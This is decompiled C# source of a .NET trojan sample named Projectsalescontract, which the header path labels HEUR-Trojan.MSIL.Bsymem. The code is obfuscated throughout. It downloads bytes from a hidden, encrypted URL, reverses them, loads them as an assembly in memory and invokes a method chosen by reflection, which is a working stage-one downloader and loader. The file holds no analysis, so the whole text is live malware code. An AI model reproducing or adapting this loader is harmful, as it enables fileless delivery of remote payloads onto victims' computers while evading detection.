// Decompiled with JetBrains decompiler
// Type: Frctm.Data
// Assembly: Projectsalescontract, Version=2.5.9.113, Culture=neutral, PublicKeyToken=null
// MVID: C0D5C897-24B6-2797-809A-DB5C7C9E05A3
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Bsymem.gen-553ae5ab3e1e1f615196d986ce47e2eab792dfdbc5f15a9e72ad8645292cb4b0.exe

using Frctm.Properties;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Reflection;

namespace Frctm
{
  public static class Data
  {
    internal static Delegate \uE000;

    public static void Another()
    {
label_8:
      int num1 = \uE010.\uE023(11);
      int num2 = -4;
label_2:
      byte[] numArray;
      int length;
      List<byte> byteList;
      while (true)
      {
        num2 ^= 8;
label_4:
        int num3 = \uE010.\uE023(12);
        while (true)
        {
          switch (num3 ^ 10)
          {
            case 8:
label_5:
              num2 = \uE010.\uE023(10);
              num3 = 0;
              continue;
            case 9:
              switch (num2 + 14)
              {
                case 0:
                  goto label_8;
                case 1:
                  switch (num1)
                  {
                    case 12:
                      numArray = Data.\uE002(\uE008.\uE000(19967));
                      num1 = 9;
                      goto label_1;
                    case 13:
                      length = numArray.Length;
                      num1 = 8;
                      goto label_1;
                    case 14:
                      byteList = new List<byte>();
                      num1 = \uE010.\uE023(8);
                      goto label_1;
                    case 15:
                      goto label_15;
                    default:
                      goto label_10;
                  }
                case 2:
label_1:
                  num1 ^= 7;
                  goto label_5;
                default:
                  num3 = 2;
                  continue;
              }
            case 10:
              goto label_2;
            default:
              goto label_4;
          }
        }
label_10:
        num2 = -6;
      }
label_15:
      while ((length-- <= 0 ? 0 : 1) != 0)
        byteList.Add(numArray[length]);
      AppDomain.CurrentDomain.Load(byteList.ToArray());
    }

    internal static void \uE000()
    {
label_2:
      int num1 = \uE010.\uE023(9);
      while (true)
      {
        int index1;
        Assembly[] assemblies;
        Assembly assembly;
        switch ((num1 ^ 14) + 11)
        {
          case 0:
            assemblies = AppDomain.CurrentDomain.GetAssemblies();
            num1 = -8;
            continue;
          case 1:
            index1 = 0;
            num1 = \uE010.\uE023(5);
            continue;
          case 2:
label_5:
            assembly = assemblies[index1];
            num1 = -12;
            continue;
          case 3:
            if (index1 != 0)
            {
              num1 = -7;
              continue;
            }
            break;
          case 4:
            num1 = -5;
            continue;
          case 5:
label_10:
            int num2 = \uE010.\uE023(13);
            while (true)
            {
              Type[] types;
              int index2;
              Type type;
              switch (num2 ^ 11)
              {
                case 12:
label_11:
                  type = types[index2];
                  num2 = 25;
                  continue;
                case 13:
                  num2 = 26;
                  continue;
                case 14:
                  if (index2 != 0)
                  {
                    num2 = 7;
                    continue;
                  }
                  break;
                case 15:
                  types = assembly.GetTypes();
                  num2 = 27;
                  continue;
                case 16:
                  index2 = 0;
                  num2 = 5;
                  continue;
                case 17:
                  num2 = 4;
                  continue;
                case 18:
                  try
                  {
                    MethodInfo method = type.GetMethod(\uE008.\uE000(19817));
label_20:
                    int num3 = \uE010.\uE023(14);
                    while (true)
                    {
                      switch ((num3 ^ 9) + 5)
                      {
                        case 0:
                          Data.\uE000.DynamicInvoke();
                          num3 = \uE010.\uE023(6);
                          continue;
                        case 1:
                          Data.\uE000 = Delegate.CreateDelegate(typeof (Action), (object) null, method);
                          num3 = -14;
                          continue;
                        case 2:
                          num3 = -9;
                          continue;
                        case 3:
                          goto label_25;
                        default:
                          goto label_20;
                      }
                    }
                  }
                  catch
                  {
                  }
label_25:
                  ++index2;
                  break;
                default:
                  goto label_10;
              }
              if (index2 < types.Length)
                goto label_11;
              else
                break;
            }
            ++index1;
            break;
          default:
            goto label_2;
        }
        if (index1 < assemblies.Length)
          goto label_5;
        else
          break;
      }
    }

    internal static Assembly \uE001(byte[] _param0)
    {
label_10:
      int num1 = \uE010.\uE023(18);
      int num2 = 0;
label_2:
      Assembly assembly;
      while (true)
      {
        num2 ^= 18;
label_4:
        // ISSUE: reference to a compiler-generated method
        int num3 = Resources.\uE000(15);
        while (true)
        {
          switch (num3 ^ 22)
          {
            case 19:
              switch (num2)
              {
                case 16:
                  switch (num1)
                  {
                    case 5:
                      assembly = AppDomain.CurrentDomain.Load(_param0);
                      num1 = 14;
                      goto label_1;
                    case 6:
                    case 7:
                      goto label_12;
                    default:
                      goto label_9;
                  }
                case 17:
                  goto label_10;
                case 18:
label_1:
                  num1 ^= 8;
                  goto label_7;
                default:
                  num3 = 2;
                  continue;
              }
            case 20:
label_7:
              num2 = \uE010.\uE023(24);
              num3 = 3;
              continue;
            case 21:
              goto label_2;
            default:
              goto label_4;
          }
        }
label_9:
        num2 = 3;
      }
label_12:
      return assembly;
    }

    internal static byte[] \uE002(string _param0)
    {
      try
      {
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
      }
      catch
      {
      }
      HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create(_param0);
label_7:
      // ISSUE: reference to a compiler-generated method
      int num1 = Resources.\uE000(23);
      int num2 = -6;
      while (true)
      {
        switch ((num2 ^ 20) + 20)
        {
          case 0:
            goto label_7;
          case 1:
            switch (num1 + 15)
            {
              case 0:
                num1 = -28;
                goto label_4;
              case 1:
                httpWebRequest.Method = \uE008.\uE000(19613);
                num1 = -26;
                goto label_4;
              case 2:
                goto label_12;
              default:
                num2 = -8;
                continue;
            }
          case 2:
label_4:
            num1 ^= 23;
            break;
        }
        // ISSUE: reference to a compiler-generated method
        num2 = Resources.\uE000(32);
      }
label_12:
      MemoryStream memoryStream = new MemoryStream();
      try
      {
        HttpWebResponse response = (HttpWebResponse) httpWebRequest.GetResponse();
        try
        {
          Stream responseStream = response.GetResponseStream();
          try
          {
            byte[] buffer = new byte[1024];
label_17:
            int num3;
            do
            {
              // ISSUE: reference to a compiler-generated method
              int num4 = Resources.\uE000(15);
              int count;
              bool flag;
              while (true)
              {
                switch (num4 ^ 23)
                {
                  case 17:
                    num4 = 1;
                    continue;
                  case 18:
                    count = responseStream.Read(buffer, 0, 1024);
                    num4 = 3;
                    continue;
                  case 19:
                    if (flag)
                    {
                      num4 = 0;
                      continue;
                    }
                    goto label_26;
                  case 20:
                    memoryStream.Write(buffer, 0, count);
                    num4 = 2;
                    continue;
                  case 21:
                    num4 = 6;
                    continue;
                  case 22:
                    flag = count > 0;
                    // ISSUE: reference to a compiler-generated method
                    num4 = Resources.\uE000(16);
                    continue;
                  case 23:
                    goto label_25;
                  default:
                    goto label_17;
                }
              }
label_25:
              num3 = 1;
              goto label_27;
label_26:
              num3 = 0;
label_27:;
            }
            while (num3 != 0);
            return memoryStream.ToArray();
          }
          finally
          {
            if ((responseStream == null ? 1 : 0) == 0)
              responseStream.Dispose();
          }
        }
        finally
        {
          if ((response == null ? 1 : 0) == 0)
            response.Dispose();
        }
      }
      finally
      {
        if ((memoryStream == null ? 1 : 0) == 0)
          memoryStream.Dispose();
      }
    }
  }
}
